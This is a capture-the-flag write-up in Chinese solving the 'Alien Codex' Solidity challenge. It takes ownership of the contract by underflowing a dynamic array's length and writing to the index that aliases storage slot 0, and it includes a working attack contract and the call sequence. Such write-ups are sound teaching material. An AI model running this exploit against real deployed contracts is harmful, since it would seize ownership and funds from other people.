# Alien Codex
Alien Codex這一關要求我們取得這個合約的ownership，主要考察了對於array storage的相關知識，讓我們先看代碼

## 合约代码
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import '../helpers/Ownable-05.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
    codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
```
## 代码分析
首先我們可以知道AlienCodex這個合約繼承了Ownable這個合約，而在Ownable當中，我們會儲存一個address。當A合約繼承了B合約時，B合約當中需要儲存的變量會在storage中以slot0開始儲存，其次才是輪到A合約中的狀態變量。所以我們可以知道，AlienCodex這個合約中的owner變量存在storage的slot0，接下來是一個boolean contact,因為一個slot有32 bytes，而owner是一個address，只佔20 bytes，contact佔1 bytes，所以contact也會存在slot0中。而codex作為一個bytes32的array,是一個dynamically-sized array,所以會在slot1中以uint256的方式存儲它的長度，並且在後面的slot中按照順序存儲這個array本身，起始位置在slot keccak256(1)。

當我們去查看目前的codex的長度時，使用web3.eth.getStorageAt(instance,1)，我們獲得了0x0000000000000000000000000000000000000000000000000000000000000000，這意味著目前這個array的長度為0。記得storage的總共的slot數量為2^256個，從slot0開始到slot2^256-1,如果我們可以讓這個dynamically-sized array的長度為2^256，那麼就可以使其最後的那個元素overflow到slot0，那麼我們就可以修改存儲在slot0的owner變量了。

首先我們需要將contact設置為true，這樣才能使用record,retract和revise這三個函數。之後我們需要使用retract，使得codex的長度從0 underflow至2^256。這樣只要我們再使用revise修改在array overflow到slot0這個位置的元素，就可以做到修改owner的效果。

現在我們需要確定是array的哪一個位置在slot0，array的存儲位置規則為：
假如array存在的storage slot p,那麼array的index i元素的位置為 keccak256(p)+i。
如今我們已知keccak256(1) + i = 2^256, 那麼i = 2^256 - keccak256(1)。使用revise修改後，便可以成功取得這個合約的ownership。

## 攻擊代碼
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAlienCodex {
    function revise(uint i, bytes32 _content) external;
}

contract Attack {
    function attack(address _target) public {
        unchecked{
            uint index = uint256(2)**uint256(256) - uint256(keccak256(abi.encodePacked(uint256(1))));
            IAlienCodex(_target).revise(index, bytes32(uint256(uint160(msg.sender))));
        }   
    }
}

## 攻擊過程
1. 調用make_contact()，再調用retract()。
2. 部署Atttack合約，傳入關卡的合約地址，調用attack(),完成任務。

